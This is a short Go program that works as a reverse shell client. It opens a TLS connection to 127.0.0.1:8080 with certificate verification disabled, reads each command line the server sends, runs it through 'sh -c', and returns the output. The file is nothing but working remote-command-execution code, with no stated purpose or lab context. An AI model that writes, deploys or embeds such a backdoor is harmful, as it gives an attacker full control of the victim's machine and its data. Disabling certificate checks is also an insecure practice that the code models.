package main

import (
	"bufio"
	"crypto/tls"
	"encoding/binary"
	"fmt"
	"os/exec"
	"strings"
)

func main() {
	// Configure TLS client (skip certificate verification)
	config := &tls.Config{InsecureSkipVerify: true}
	conn, err := tls.Dial("tcp", "127.0.0.1:8080", config)
	if err != nil {
		fmt.Println("Error connecting to server:", err)
		return
	}
	defer conn.Close()
	fmt.Println("Connected to server via secure connection")

	for {
		command, err := bufio.NewReader(conn).ReadString('\n')
		if err != nil {
			fmt.Println("Error reading command:", err)
			return
		}
		command = strings.TrimSpace(command)

		fmt.Println("Executing command:", command)
		cmd := exec.Command("sh", "-c", command)
		output, err := cmd.CombinedOutput()
		if err != nil {
			output = append(output, []byte("\nExecution error: "+err.Error())...)
		}

		// Send output size
		var length int32 = int32(len(output))
		binary.Write(conn, binary.LittleEndian, length)

		// Send the actual output
		_, err = conn.Write(output)
		if err != nil {
			fmt.Println("Error sending response:", err)
			return
		}
	}
}